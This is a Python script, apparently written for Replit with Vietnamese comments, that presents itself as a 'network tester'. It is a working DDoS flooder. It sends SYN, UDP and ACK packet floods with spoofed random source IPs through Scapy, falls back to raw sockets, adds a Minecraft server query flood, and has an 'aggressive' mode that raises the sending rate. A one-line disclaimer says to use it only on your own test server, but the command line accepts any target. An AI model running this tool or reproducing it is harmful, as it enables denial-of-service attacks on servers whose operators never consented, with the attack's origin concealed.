#!/usr/bin/env python3
import sys
import os
import multiprocessing
import threading
import random
import time
import argparse
import logging
import socket
import struct
import concurrent.futures
from datetime import datetime
import signal

# Try to import optional dependencies
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("psutil không được cài đặt. Chạy 'pip install psutil' để cài đặt.")

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Scapy không được cài đặt. Chạy 'pip install scapy' để cài đặt.")

try:
    from mcstatus import JavaServer
    MCSTATUS_AVAILABLE = True
except ImportError:
    MCSTATUS_AVAILABLE = False
    print("mcstatus không được cài đặt. Chạy 'pip install mcstatus' để cài đặt cho tấn công Query.")

# Công cụ kiểm thử mạng (SYN, UDP, ACK, Query Flood) tối ưu cho Replit
# Chỉ chạy trên server thử nghiệm của bạn!
# Cách dùng: python3 network_tester.py --host <IP> --port <PORT> --processes <QUY_TRÌNH> --duration <GIÂY> [--log <FILE>] [--attack-ratio <SYN:UDP:ACK:QUERY>] [--batch-size <SỐ>] [--delay <GIÂY>]

class NetworkTester:
    def __init__(self, target_ip, target_port, processes, duration, log_file=None, attack_ratio="40:30:20:10", 
                 batch_size=100, delay=0.01, use_socket_only=False, verbose=False, aggressive=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.use_socket_only = use_socket_only  # Tùy chọn chỉ dùng socket
        self.verbose = verbose  # Tùy chọn hiển thị chi tiết
        self.aggressive = aggressive  # Chế độ tấn công tăng cường
        
        # Xác định số quy trình dựa trên CPU hoặc mặc định là 2
        if psutil:
            available_cores = psutil.cpu_count() or 2
            # Nếu chế độ tăng cường, sử dụng nhiều cores hơn
            if self.aggressive:
                self.processes = min(processes, available_cores * 2)
            else:
                self.processes = min(processes, available_cores)
        else:
            self.processes = min(processes, 4 if self.aggressive else 2)
            
        self.duration = duration
        
        # Tùy chỉnh batch size dựa vào chế độ
        if self.aggressive:
            self.batch_size = max(50, min(batch_size * 2, 2000))  # Tăng batch size trong chế độ tăng cường
        else:
            self.batch_size = max(10, min(batch_size, 1000))
            
        # Giảm độ trễ trong chế độ tăng cường
        self.delay = max(0, min(delay * (0.5 if self.aggressive else 1.0), 1.0))
        
        # Counters cho thống kê
        self.packet_count = multiprocessing.Value('i', 0)
        self.query_count = multiprocessing.Value('i', 0)
        
        # Tạo IP giả với nhiều địa chỉ hơn nếu ở chế độ tăng cường
        ip_pool_size = 10000 if self.aggressive else 1000
        self.fake_ips = list({f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                             for _ in range(ip_pool_size)})
        
        # Phân tích tỷ lệ tấn công
        try:
            ratios = [float(x) for x in attack_ratio.split(":")]
            if len(ratios) != 4 or sum(ratios) != 100:
                raise ValueError
            self.syn_ratio, self.udp_ratio, self.ack_ratio, self.query_ratio = [r/100 for r in ratios]
        except ValueError:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:QUERY, tổng=100 (ví dụ: 40:30:20:10)")

        # Thiết lập logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler(log_file) if log_file else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger()

        # Kiểm tra nếu chỉ dùng socket
        if self.use_socket_only:
            self.logger.info("Chế độ Socket: Chỉ sử dụng socket thông thường (không cần quyền root)")
            
        # Kiểm tra nếu scapy khả dụng
        elif not SCAPY_AVAILABLE:
            self.logger.warning("Scapy không khả dụng. Sử dụng socket trực tiếp thay thế (hiệu suất thấp hơn).")
            self.use_socket_only = True
            
        # Kiểm tra nếu mcstatus khả dụng
        if not MCSTATUS_AVAILABLE:
            self.logger.warning("mcstatus không khả dụng, vô hiệu hóa Query Flood")
            self.query_ratio = 0
            self.syn_ratio += self.query_ratio / 3
            self.udp_ratio += self.query_ratio / 3
            self.ack_ratio += self.query_ratio / 3

        # Kiểm tra phần cứng nếu có psutil
        if PSUTIL_AVAILABLE:
            ram = psutil.virtual_memory().total / (1024**3)  # GB
            if ram < 1:
                self.logger.warning(f"RAM thấp ({ram:.2f}GB). Có thể gây chậm hoặc crash.")
            if psutil.cpu_count() < 2:
                self.logger.warning(f"CPU yếu ({psutil.cpu_count()} core). Hiệu suất sẽ thấp.")

    def send_syn_packet(self):
        """Gửi gói SYN bằng socket (không cần quyền root)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(0)  # Non-blocking
            s.settimeout(0.05)  # Giảm timeout để tăng tốc độ
            # Thêm các tùy chọn socket để tăng hiệu suất
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            # Kết nối không hoàn chỉnh để gửi SYN
            s.connect_ex((self.target_ip, self.target_port))
            s.close()
            return True
        except:
            if self.verbose:
                self.logger.debug(f"Lỗi gửi SYN đến {self.target_ip}:{self.target_port}")
            return False

    def send_udp_packet(self):
        """Gửi gói UDP bằng socket (không cần quyền root)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Tạo dữ liệu ngẫu nhiên có kích thước lớn hơn
            data = os.urandom(1024)  # Tăng kích thước gói tin cho hiệu quả cao hơn
            # Thêm socket option
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # Tăng buffer kích thước gửi
            s.sendto(data, (self.target_ip, self.target_port))
            s.close()
            return True
        except:
            if self.verbose:
                self.logger.debug(f"Lỗi gửi UDP đến {self.target_ip}:{self.target_port}")
            return False

    def send_ack_packet(self):
        """Cho ACK, cần mô phỏng bằng kết nối"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)  # Non-blocking
            s.settimeout(0.05)  # Giảm timeout để tăng tốc
            # Thêm tùy chọn cho kết nối
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            # Cố gắng kết nối
            err = s.connect_ex((self.target_ip, self.target_port))
            if err == 0 or err == 10035 or err == 115:  # EWOULDBLOCK hoặc EINPROGRESS
                # Kết nối đang trong quá trình hoặc thành công, đóng ngay
                s.close()
            return True
        except:
            if self.verbose:
                self.logger.debug(f"Lỗi gửi ACK đến {self.target_ip}:{self.target_port}")
            return False

    def generate_and_send_packet_scapy(self, attack_type):
        """Tạo và gửi gói bằng Scapy (nếu có)"""
        if not SCAPY_AVAILABLE:
            return False
            
        try:
            src_ip = random.choice(self.fake_ips)
            src_port = random.randint(1024, 65535)
            
            if attack_type == "syn":
                packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000000))
            elif attack_type == "udp":
                packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=self.target_port)
            elif attack_type == "ack":
                packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="A", seq=random.randint(1000, 9000000), ack=random.randint(1000, 9000000))
            else:
                return False
                
            send(packet, verbose=0)
            return True
        except Exception as e:
            if self.verbose:
                self.logger.debug(f"Lỗi gửi gói Scapy: {e}")
            return False

    def query_flood(self):
        """Gửi Query (L7)"""
        if not MCSTATUS_AVAILABLE:
            return False
            
        try:
            server = JavaServer(self.target_ip, self.target_port)
            server.status(timeout=1)  # Timeout ngắn
            with self.query_count.get_lock():
                self.query_count.value += 1
            return True
        except Exception as e:
            if self.verbose:
                self.logger.debug(f"Lỗi Query Flood: {e}")
            return False

    def attack_process(self, stop_event):
        """Quy trình gửi gói SYN/UDP/ACK và Query"""
        try:
            # Tạo ID thread/process để xáo trộn seeding
            thread_id = threading.get_ident() % 10000
            # Khởi tạo bộ sinh số ngẫu nhiên riêng cho mỗi thread
            local_random = random.Random(time.time() + thread_id)
            
            # Khởi tạo ThreadPoolExecutor để gửi song song các gói
            max_workers = 10  # Số lượng luồng con cho mỗi process
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                while not stop_event.is_set():
                    futures = []
                    success_count = 0
                    
                    # Batch sending với ThreadPoolExecutor
                    for _ in range(self.batch_size):
                        r = local_random.random()
                        
                        if r < self.syn_ratio:
                            if self.use_socket_only:
                                future = executor.submit(self.send_syn_packet)
                            else:
                                future = executor.submit(self.generate_and_send_packet_scapy, "syn")
                        elif r < self.syn_ratio + self.udp_ratio:
                            if self.use_socket_only:
                                future = executor.submit(self.send_udp_packet)
                            else:
                                future = executor.submit(self.generate_and_send_packet_scapy, "udp")
                        elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                            if self.use_socket_only:
                                future = executor.submit(self.send_ack_packet)
                            else:
                                future = executor.submit(self.generate_and_send_packet_scapy, "ack")
                        else:
                            future = executor.submit(self.query_flood)
                            
                        futures.append(future)
                    
                    # Thu thập kết quả từ futures
                    for future in concurrent.futures.as_completed(futures):
                        if future.result():
                            success_count += 1
                    
                    # Cập nhật số lượng gói thành công
                    with self.packet_count.get_lock():
                        self.packet_count.value += success_count
                    
                    # Delay cần thiết nếu cấu hình
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
        except MemoryError:
            self.logger.error("Hết bộ nhớ! Giảm --batch-size hoặc --processes.")
        except Exception as e:
            self.logger.error(f"Lỗi quy trình: {e}")

    def stats_process(self, stop_event):
        """Quy trình thống kê thời gian thực"""
        # Ghi nhận thời gian bắt đầu và các biến thống kê
        local_start_time = time.time()
        last_time = local_start_time
        last_count = 0
        last_query = 0
        peak_rate = 0
        total_samples = 0
        total_rate = 0
        
        while not stop_event.is_set():
            try:
                time.sleep(0.9)  # Giảm nhẹ thời gian chờ để thống kê nhanh hơn
                current_time = time.time()
                time_diff = current_time - last_time
                
                with self.packet_count.get_lock(), self.query_count.get_lock():
                    current_count = self.packet_count.value
                    current_query = self.query_count.value
                    
                    # Tính tốc độ dựa trên khoảng thời gian chính xác thay vì giả định 1 giây
                    if time_diff > 0:
                        packet_rate = int((current_count - last_count) / time_diff)
                        query_rate = int((current_query - last_query) / time_diff)
                    else:
                        packet_rate = 0
                        query_rate = 0
                    
                    # Cập nhật thống kê tốc độ cao nhất
                    peak_rate = max(peak_rate, packet_rate)
                    total_samples += 1
                    total_rate += packet_rate
                    
                    # Cập nhật số đếm và thời gian cho lần sau
                    last_count = current_count
                    last_query = current_query
                    last_time = current_time
                    
                    elapsed = current_time - local_start_time
                    
                    # Lấy thông tin hệ thống
                    if psutil:
                        cpu_usage = psutil.cpu_percent()
                        mem_usage = psutil.virtual_memory().percent
                        cpu_info = f"CPU: {cpu_usage:.1f}% | RAM: {mem_usage:.1f}%"
                    else:
                        cpu_info = "CPU: N/A | RAM: N/A"
                    
                    # Tính tốc độ trung bình
                    avg_rate = total_rate / total_samples if total_samples > 0 else 0
                    
                    # Hiển thị thống kê chi tiết hơn
                    self.logger.info(
                        f"Gói: {current_count:,} | "
                        f"Tốc độ hiện tại: {packet_rate:,} gói/giây | "
                        f"TB: {avg_rate:.1f} | "
                        f"Cao nhất: {peak_rate:,} | "
                        f"Query: {current_query:,} ({query_rate:,}/giây) | "
                        f"{cpu_info} | "
                        f"Thời gian: {elapsed:.1f}s"
                    )
            except Exception as e:
                self.logger.error(f"Lỗi thống kê: {e}")

    def run(self):
        """Chạy Network Tester"""
        self.logger.info(f"Bắt đầu kiểm thử đến {self.target_ip}:{self.target_port}")
        self.logger.info(f"Số quy trình: {self.processes} | Thời gian: {self.duration}s | Batch size: {self.batch_size} | Delay: {self.delay}s")
        self.logger.info(f"Tỷ lệ kiểm thử: SYN={self.syn_ratio*100:.0f}% UDP={self.udp_ratio*100:.0f}% ACK={self.ack_ratio*100:.0f}% Query={self.query_ratio*100:.0f}%")
        self.logger.info(f"Thời điểm: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.logger.info(f"Phương thức: {'Socket thông thường' if self.use_socket_only else ('Scapy' if SCAPY_AVAILABLE else 'Socket thông thường')}")
        
        # Tạo stop event
        try:
            manager = multiprocessing.Manager()
            stop_event = manager.Event()
        except:
            # Fallback cho Replit nếu có vấn đề với Manager
            self.logger.warning("Không thể tạo multiprocessing Manager, sử dụng threading.Event thay thế")
            stop_event = threading.Event()
        
        # Khởi động quy trình thống kê
        stats = threading.Thread(target=self.stats_process, args=(stop_event,))
        stats.daemon = True
        stats.start()
        
        # Khởi động quy trình tấn công
        processes = []
        
        # Cho Replit, ưu tiên sử dụng Thread thay vì Process
        use_threading = True
        
        for i in range(self.processes):
            if use_threading:
                # Sử dụng thread cho tất cả các quy trình trên Replit
                thread = threading.Thread(target=self.attack_process, args=(stop_event,))
                thread.daemon = True
                thread.start()
                processes.append(thread)
                self.logger.info(f"Khởi động thread kiểm thử {i+1}/{self.processes}")
            else:
                proc = multiprocessing.Process(target=self.attack_process, args=(stop_event,))
                proc.daemon = True
                processes.append(proc)
                proc.start()
                self.logger.info(f"Khởi động quy trình {i+1}/{self.processes}")
        
        # Chờ thời gian chỉ định
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            self.logger.warning("Người dùng dừng chương trình...")
        
        # Dừng tất cả quy trình
        stop_event.set()
        
        # Join processes
        for proc in processes:
            if isinstance(proc, multiprocessing.Process):
                proc.join(timeout=2)
            else:  # threading.Thread
                proc.join(timeout=2)
        
        if isinstance(stats, threading.Thread):
            stats.join(timeout=2)
        
        # Báo cáo cuối
        with self.packet_count.get_lock(), self.query_count.get_lock():
            elapsed = time.time() - start_time if 'start_time' in locals() else self.duration
            packet_rate = self.packet_count.value / elapsed if elapsed > 0 else 0
            query_rate = self.query_count.value / elapsed if elapsed > 0 else 0
            
            self.logger.info(f"Kết thúc! Tổng gói (SYN/UDP/ACK): {self.packet_count.value:,} | Tổng Query: {self.query_count.value:,}")
            self.logger.info(f"Tốc độ trung bình: {packet_rate:.1f} gói/giây | {query_rate:.1f} query/giây")
            self.logger.info(f"Thời điểm kết thúc: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    print("\n[!] Đang dừng chương trình...")
    sys.exit(0)

if __name__ == "__main__":
    # Xử lý tín hiệu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cấu hình CLI
    parser = argparse.ArgumentParser(
        description="Công cụ kiểm thử mạng nâng cao (SYN, UDP, ACK, Query Flood)",
        epilog="Ví dụ: python3 network_tester.py --host 127.0.0.1 --port 80 --processes 4 --duration 30 --log test.log --attack-ratio 40:30:20:10 --batch-size 100 --delay 0.01"
    )
    parser.add_argument("--host", required=True, help="IP server đích (ví dụ: 127.0.0.1)")
    parser.add_argument("--port", type=int, required=True, help="Cổng đích (ví dụ: 80)")
    parser.add_argument("--processes", type=int, default=2, help="Số quy trình (mặc định: 2)")
    parser.add_argument("--duration", type=int, default=30, help="Thời gian (giây, mặc định: 30)")
    parser.add_argument("--log", help="File log (ví dụ: test.log)")
    parser.add_argument("--attack-ratio", default="40:30:20:10", help="Tỷ lệ tấn công SYN:UDP:ACK:QUERY, tổng=100 (mặc định: 40:30:20:10)")
    parser.add_argument("--batch-size", type=int, default=100, help="Số gói mỗi lần gửi (mặc định: 100)")
    parser.add_argument("--delay", type=float, default=0.01, help="Độ trễ giữa các đợt gửi (giây, mặc định: 0.01)")
    parser.add_argument("--socket-only", action="store_true", help="Chỉ sử dụng Socket thông thường, không cần quyền root")
    parser.add_argument("--verbose", "-v", action="store_true", help="Hiển thị chi tiết hơn")
    parser.add_argument("--aggressive", "-a", action="store_true", help="Chế độ tăng cường hiệu suất gửi gói")
    
    args = parser.parse_args()
    
    # Hiển thị banner
    print(f"""
╔═══════════════════════════════════════════════════════╗
║                 NETWORK TESTER PRO                    ║
║                                                       ║
║  Mục tiêu: {args.host}:{args.port}                     
║  Thời gian: {args.duration} giây | Tiến trình: {args.processes} | {"Chế độ tăng cường" if args.aggressive else "Chế độ thường"}
╚═══════════════════════════════════════════════════════╝
""")
    
    try:
        tester = NetworkTester(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes,
            duration=args.duration,
            log_file=args.log,
            attack_ratio=args.attack_ratio,
            batch_size=args.batch_size,
            delay=args.delay,
            use_socket_only=args.socket_only,
            verbose=args.verbose,
            aggressive=args.aggressive
        )
        tester.run()
    except ValueError as e:
        logging.error(f"Lỗi cấu hình: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Ngắt bởi người dùng, đang thoát...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Lỗi khởi động: {e}")
        sys.exit(1)